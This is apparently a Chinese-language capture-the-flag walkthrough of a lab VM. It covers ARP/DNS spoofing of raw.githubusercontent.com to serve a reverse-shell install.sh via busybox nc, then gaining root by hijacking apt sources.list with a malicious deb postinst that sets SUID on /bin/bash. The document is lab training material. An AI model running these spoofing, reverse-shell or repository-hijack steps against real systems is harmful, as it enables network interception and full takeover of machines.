# 一、信息收集

## 1.1 主机发现

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:b6:03:66       PCS Systemtechnik GmbH
...
```

确定目标主机：`192.168.205.129`

## 1.2 端口扫描

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 19:30 CST
Nmap scan report for 192.168.205.129
Host is up (0.00023s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:4C:A7:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

发现开放端口：

- 22/tcp (SSH)
- 80/tcp (HTTP)

## 1.3 Web应用分析

访问 HTTP 服务，发现页面显示以下命令：

![image-20251012193551189](http://7r1UMPHK.github.io/image/20251012202159865.webp)

页面显示的命令：

```bash
curl https://raw.githubusercontent.com/ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh
cd d2VsY29tZTpqdW1v && ./install.sh 
```

这提示我们系统后台可能有定时任务在执行这些命令，存在 DNS 劫持的可能性。

# 二、初始访问

## 2.1 攻击思路分析

根据页面显示的命令，判断后台可能存在定时脚本循环执行 curl 命令。我们可以通过以下方式获取初始访问权限：

1. DNS 劫持 `raw.githubusercontent.com` 域名
2. 搭建恶意 HTTPS 服务器
3. 提供恶意的 `install.sh` 脚本

## 2.2 环境准备

### 2.2.1 创建恶意文件结构

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p ll104567/d2VsY29tZTpqdW1v/refs/heads/main/
```

### 2.2.2 制作恶意脚本

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo 'busybox nc 192.168.205.128 8888 -e /bin/bash' > ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh
```

### 2.2.3 生成SSL证书

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=raw.githubusercontent.com"
...
```

### 2.2.4 启动HTTPS服务

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo openssl s_server -accept 443 -WWW -key key.pem -cert cert.pem 
Using default temp DH parameters
ACCEPT
```

## 2.3 DNS劫持

使用 bettercap 进行 ARP 欺骗和 DNS 劫持：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo bettercap
bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

192.168.205.0/24 > 192.168.205.128  » set arp.spoof.targets 192.168.205.129
192.168.205.0/24 > 192.168.205.128  » set dns.spoof.domains raw.githubusercontent.com
192.168.205.0/24 > 192.168.205.128  » set dns.spoof.address 192.168.205.128
192.168.205.0/24 > 192.168.205.128  » arp.spoof on
192.168.205.0/24 > 192.168.205.128  » dns.spoof on
```

## 2.4 获取初始Shell

### 2.4.1 监听反向连接

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...
```

### 2.4.2 成功获取连接

观察到目标主机访问了我们的恶意服务：

```bash
# HTTPS服务器日志
FILE:ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh

# DNS劫持日志
[19:46:03] [sys.log] [inf] dns.spoof sending spoofed DNS reply for raw.githubusercontent.com (->192.168.205.128) to 192.168.205.129
```

成功获取反向Shell：

```bash
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 37412
id
uid=1001(fish) gid=1001(fish) groups=1001(fish)
```

### 2.4.3 稳定Shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# 三、权限提升

## 3.1 权限分析

检查当前用户的sudo权限：

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ sudo -l
Matching Defaults entries for fish on Chain:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fish may run the following commands on Chain:
    (ALL) NOPASSWD: /usr/bin/apt update
    (ALL) NOPASSWD: /usr/bin/apt install dsz
    (ALL) NOPASSWD: /usr/bin/apt remove dsz
```

发现用户可以无密码执行特定的 apt 命令。

## 3.2 寻找可写文件

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
...
/etc/apt/sources.list
...
```

发现 `/etc/apt/sources.list` 文件可写，这为我们提供了包仓库劫持的机会。

## 3.3 恶意APT包制作

### 3.3.1 创建包结构

在攻击机上创建恶意 DEB 包：

```bash
dsz/
├── DEBIAN/
│   ├── control
│   └── postinst
└── [其他文件]
```

### 3.3.2 编写控制文件

创建 `dsz/DEBIAN/control`：

```
Package: dsz
Version: 1.0
Architecture: all
Maintainer: dsz
Description: dsz
```

### 3.3.3 编写安装后脚本

创建 `dsz/DEBIAN/postinst`（需要执行权限）：

```bash
#!/bin/bash
chmod +s /bin/bash
```

这个脚本会在包安装后为 `/bin/bash` 设置 SUID 位。

### 3.3.4 构建包和仓库

```bash
# 构建DEB包
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dpkg-deb --build dsz dsz.deb

# 生成包索引
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dpkg-scanpackages . /dev/null > Packages

# 创建Release文件
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat > Release << 'EOF'
Archive: stable
Component: main
Origin: evil
Label: evil
Architecture: all
EOF

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cp Release InRelease
```

### 3.3.5 启动HTTP服务

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## 3.4 执行包仓库劫持

### 3.4.1 修改sources.list

在目标机器上修改 APT 源：

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ echo "deb [trusted=yes] http://192.168.205.128/dsz ./" > /etc/apt/sources.list
```

`[trusted=yes]` 参数忽略 GPG 签名验证。

### 3.4.2 更新包列表

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ sudo apt update
Get:1 http://192.168.205.128/dsz ./ InRelease [75 B]
...
Get:4 http://192.168.205.128/dsz ./ Packages [265 B]
...
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
```

### 3.4.3 安装恶意包

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ sudo apt install dsz
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
...
Setting up dsz (1.0) ...
```

## 3.5 获取Root权限

### 3.5.1 验证SUID设置

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

成功为 `/bin/bash` 设置了 SUID 位。

### 3.5.2 提升权限

```bash
fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ bash -p
bash-5.0# id
uid=1001(fish) gid=1001(fish) euid=0(root) egid=0(root) groups=0(root),1001(fish)
```

使用 `bash -p` 保持特权模式，成功获取 root 权限。

# 四、获取Flag

```bash
bash-5.0# cat /root/root.txt /home/fish/user.txt 
flag{root-295744a86a16286a5657ebe336ba39a5}
flag{user-f307bc02d0f7e60e52d128a0c27b8e34}
```